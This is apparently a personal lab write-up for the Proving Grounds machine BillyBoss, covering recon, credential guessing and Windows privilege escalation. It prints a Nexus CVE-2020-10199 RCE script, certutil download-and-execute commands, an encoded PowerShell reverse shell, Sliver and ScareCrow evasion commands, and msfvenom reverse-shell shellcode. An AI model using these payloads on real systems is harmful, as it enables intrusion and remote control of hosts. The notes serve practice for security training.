# BillyBoss Helped-Through

Name: BillyBoss
Date:  8/11/2023
Difficulty:  Intermediate
Goals:  
- TJNull a day 
Learnt:
- Guessing passwords that `servicename : servicename` is *educated* 
Beyond Root:

- [[BillyBoss-Notes.md]]
- [[BillyBoss-CMD-by-CMDs.md]]

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](OS-ProvingGrounds/BillyBoss/Screenshots/ping.png)

![](checkingifcmeftpwouldgivebuild.png)

![](baget.png)
[BaGet](https://github.com/loic-sharma/BaGet) Open sourced server for [NuGet](https://learn.microsoft.com/en-us/nuget/what-is-nuget), which is a sdk and .NET sharing tool that shares ZIPed files with .nupkg extension



Trying to be more thoughtful I summarised my paths to compromising the server (Pre-big nmap scan finished):
- BaGet Vuln
- Upload -> Execute | Host 

This changed
![](goodrescan.png)

Given that we can upload sdks and .NET my assumption is that there will be strict Firewall and AV rules on the box that mean we have to use the BaGet to upload to the box to execute our PrivEsc.

After nmap we can cme for hostname and a domain name
![](cmesmbenum.png)

One challenge of this box that I discovered is that we may have to manually enumerate the API as there is content discovery prevention. Nikto output is weird twice and feroxbuster is not finding anything. Indicating (with browser) it is not a IP blacklist, but a jsut a rate limiter. 

[Port 5040 is the SANS Storm Center](https://isc.sans.edu/data/port.html?port=5040), personally I really want this to be way in - I have watched a lot of SANS talks on YouTube.

![](nuxesrepomanager.png)
[Default Administrator Password for Nexus](https://help.sonatype.com/repomanager2/installing-and-running/post-install-checklist)
`admin : admin123`
![](nodefaultnexuspassword.png)

no `admin:admin` or `admin:adminadmin`
![](notadminoradminadmin.png)
[[nexus-detect-http___192.168.205.61_8081_service_rest_swagger.json]] at the bottom discloses API for change password!
![](nuclei-changepassword.png)
 Nexus 3.21.0-05, which has RCE Auth on 8081 - https://www.exploit-db.com/exploits/49385

Tried both these - `ffuf`-ed .nupkgs without any result.
```
Disallow: /repository/
Disallow: /service/
```

[Nexus repository Users documentation](https://help.sonatype.com/repomanager3/nexus-repository-administration/access-control/users)
![](useridsfornexus.png)

![](notfoundadmin.png)

![](nonexusbilly.png)

![](userenumwithcme.png)

Double checking outside of manual playing around with repeater - blind API enumeration...
![](redriectonv2.png)

![](billyboss-baget-api-manual-recon.excalidraw)

![](apikeyrequired.png)

 
 Obfuscated js is webpack dependecy bundler - according to [Phind](www.phind.com)
```js
function e(e) {
        for(var r, t, n = e[0], o = e[1], u = e[2], l = 0, a = [];
        l < n.length;
        l++)t = n[l], Object.prototype.hasOwnProperty.call(p, t)&&p[t]&&a.push(p[t][0]), p[t] = 0;
        for (r in o)Object.prototype.hasOwnProperty.call(o, r)&&(f[r] = o[r]);
        for (s&&s(e);
        a.length;
        )a.shift()();
        return c.push.apply(c, u||[]), i()
    }

    function i() {
        for(var e, r = 0;
        r < c.length;
        r++) {
            for(var t = c[r], n = !0, o = 1;
            o < t.length;
            o++) {
                var u = t[o];
                0 !=  = p[u]&&(n = !1)
            }

            n&&(c.splice(r--, 1), e = l(l.s = t[0]))
        }

        return e
    }

    var t = {}, p = {
        1:0
    }, c = [];
    function l(e) {
        if (t[e]) return t[e].exports;
        var r = t[e] = {
            i:e, l:!1, exports: {}

        };
        return f[e].call(r.exports, r, r.exports, l), r.l = !0, r.exports
    }

    l.m = f, l.c = t, l.d = function(e, r, t) {
        l.o(e, r)||Object.defineProperty(e, r, {
            enumerable:!0, get:t
        }

        )
    }, l.r = function(e) {
        "undefined" != typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e, Symbol.toStringTag, {
            value:"Module"
        }

        ), Object.defineProperty(e, "__esModule", {
            value:!0
        }

        )
    }, l.t = function(r, e) {
        if (1&e&&(r = l(r)), 8&e) return r;
        if (4&e&&"object" == typeof r&&r&&r.__esModule) return r;
        var t = Object.create(null);
        if (l.r(t) , Object.defineProperty(t, "default", {
            enumerable:!0, value:r
        }

        ), 2&e&&"string" != typeof r)for (var n in r)l.d(t, n, function(e)  {
            return r[e]
        }

        .bind(null, n));
        return t
    }, l.n = function(e) {
        var r = e&&e.__esModule?function() {
            return e.default
        }

        :function() {
            return e
        };
        return l.d(r, "a", r), r
    }, l.o = function(e, r) {
        return Object.prototype.hasOwnProperty.call(e, r)
    }, l.p = "/";
    var r = window.webpackJsonpbaget = window.webpackJsonpbaget||[], n = r.push.bind(r);
    r.push = e, r = r.slice();
    for(var o = 0;
    o < r.length;
    o++)e(r[o]);
    var s = n;
    i()
}

```

Key takeway is `window.webpackJsonpbaget = window.webpackJsonpbaget` 

![](apibruteforcenothappening.png)

![](readmenot.png)

There are is one v2 and five v3 in 0.X.0 versioning nomenclature.  

No ftp or ftps in. It is so weird to have the Web Authed RCE and probably Local PrivEsc, but no credentials or usernames. 
![](no990.png)

![](billyboss-baget-api-manual-recon.excalidraw)

The hardcoded messages is lie
![](burpsuitehasjavascripton.png)

![](APIenum1reginjson.png)
Same for /search

Almost went down a `/dependents?package=` injection rabbit hole - we already have RCE if we need find credentials
## Helped-Through Conversion ... NOT TODAY! 

I was very gutted to find that we do not require authentication and spent hours looking for a password. This box. I am not going to change this to Helped Through unless I fail the Privilege Escalation on the grounds that:
- Offsec teaches do not just fire off exploits like an idiot
- We are guessing a password I did not go hints as I did not have the time 
- Searching online says there is no default password!
- Put in the work to find a the password which is just rabbit hole! AAAAAAAARGH 

![](educatingmyself.png)
here
![](ADMINaswell.png)
here
![](aaaaaaaaaaaaaaaaa.png)

I am going to not change this to a Helped Through on these grounds that the box is just bad. If we had to find the password or leak the password in another way other than API then it would be awesome. This is going to be the first machine I rate poorly from Proving Grounds. But I guess password guessing `servicename : servicename` is an educated thing to do.

## Saltiest Foothold

```
searchsploit -m 49385

```
Sliver beacon
```bash
generate beacon --mtls  192.168.45.202:8081 --arch amd64 --os windows --save /tmp/sliver.bin -f shellcode -G


/opt/ScareCrow/ScareCrow -I /tmp/sliver.bin  -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 

GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"

upx 

mtls -L 192.168.45.202 -l 8081
```

I tried to be clever
```python
# Exploit Title: Sonatype Nexus 3.21.1 - Remote Code Execution (Authenticated)
# Exploit Author: 1F98D
# Original Author: Alvaro Muñoz
# Date: 27 May 2020
# Vendor Hompage: https://www.sonatype.com/
# CVE: CVE-2020-10199
# Tested on: Windows 10 x64
# References:
# https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype
# https://securitylab.github.com/advisories/GHSL-2020-011-nxrm-sonatype
#
# Nexus Repository Manager 3 versions 3.21.1 and below are vulnerable
# to Java EL injection which allows a low privilege user to remotely
# execute code on the target server.
#
#!/usr/bin/python3

import sys
import base64
import requests
import time

def LoginAndExec(URL,CMD):
	USERNAME='nexus' # The
	PASSWORD='nexus' # Salt
	s = requests.Session()
	print('Logging in')
	body = {
		'username': base64.b64encode(USERNAME.encode('utf-8')).decode('utf-8'),
		'password': base64.b64encode(PASSWORD.encode('utf-8')).decode('utf-8')
	}
	r = s.post(URL + '/service/rapture/session',data=body)
	if r.status_code != 204:
		print('Login unsuccessful')
		print(r.status_code)
		sys.exit(1)
	print('Logged in successfully')

	body = {
		'name': 'internal',
		'online': True,
		'storage': {
			'blobStoreName': 'default',
			'strictContentTypeValidation': True
		},
		'group': {
			'memberNames': [
				'$\\A{\'\'.getClass().forName(\'java.lang.Runtime\').getMethods()[6].invoke(null).exec(\''+CMD+'\')}"'
			]
		},
	}
	r = s.post(URL + '/service/rest/beta/repositories/go/group', json=body)
	if 'java.lang.ProcessImpl' in r.text:
		print('Command executed')
	else:
		print('Error executing command, the following was returned by Nexus')
		print(r.text)
    
	return 

if __name__ == '__main__':

	BillyBoss='http://192.168.236.61:8081'
	CMDINFIL='cmd.exe /c certutil.exe -urlcache -split -f http://192.168.45.202/Word.exe C:\programdata\install.exe'
	CMDEXECSLIVER='cmd.exe /c C:\programdata\Word.exe'
	CMDPWSHB64='powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAyACcALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoA'
	LoginAndExec(BillyBoss,CMDINFIL); time.sleep(120);
	LoginAndExec(BillyBoss,CMDEXECSLIVER)
	LoginAndExec(BillyBoss,CMDPWSHB64)
	sys.exit(0)


```
I worked but it did not execute `certutil`
## PrivEsc

![](wearebilly.png)

Potato exploit for nathan no billy
![](potatoesforbilly.png)

```powershell
certutil.exe -urlcache -split -f http://192.168.45.202/Word.exe C:\programdata\Word.exe
Start-Job { C:\programdata\Word.exe }
```

![](toughsneezing.png)

Always check the web.config
![](justincasethegaslightingisrealforthebillybossbox.png)

![](billyssysteminfo.png)

- Question how to effective exploit the potato exploit in a speedy amount of time? 
	- How old is the box?
		- Juicy Potato 
			- Either:  
				- use https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1 and https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
				- And then brute force every CLSID with https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat
			- Or use the list  https://github.com/ohpe/juicy-potato/tree/master/CLSID
				- And then brute force every CLSID with https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat

https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/Windows_10_Pro/CLSID.list

Get-ClSID did not work. And then testing all CLSID produced a load of CLSID that did not work. 

#### At this point I am running out of time so I convert to helped through 

Need to make patch not a horrifying task of shifting through - trauma of using WESNG
![](needtocheckpatchlevelonwindows.png)

SMBGhost enumeration and exploitation
```powershell
wmic qfe list 
netstat -ano
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8082 -f dll -f csharp
```


```csharp
byte[] buf = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x1f,0x92,
0xc0,0xa8,0x2d,0xca,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,
0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,
0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,
0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,
0xff,0xd5,0x48,0x81,0xc4,0x40,0x02,0x00,0x00,0x49,0xb8,0x63,
0x6d,0x64,0x00,0x00,0x00,0x00,0x00,0x41,0x50,0x41,0x50,0x48,
0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0x0d,0x59,0x41,
0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x01,0x01,0x48,0x8d,
0x44,0x24,0x18,0xc6,0x00,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,
0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,
0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,
0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0x0e,0x41,
0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,
0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5};
```

![](addedshellcode.png)

Did not work, but i had brute force every CLSID so maybe?...
![](thisdidnotwork.png)
One reset, recompile later and still not working.

WE could have done this if there was someway to login
```
msfvenom -p windows/adduser USER=root PASS=rootroot123! -f dll -f csharp
```
## Post-Root Reflection

I went straight for SeImpersonate know it may be rough, but it seemed right I my face 

- I did not run WP as I got overly focused on Potato exploits.
- Do not get hyper-focused on SeImpersonate
- Need to be quicker and branch 
- Check the patch level
	- Me not getting over my trauma of using WESNG has made me lose this box.
## Beyond Root

SMB Ghost

https://thehackernews.com/2021/07/dozens-of-vulnerable-nuget-packages.html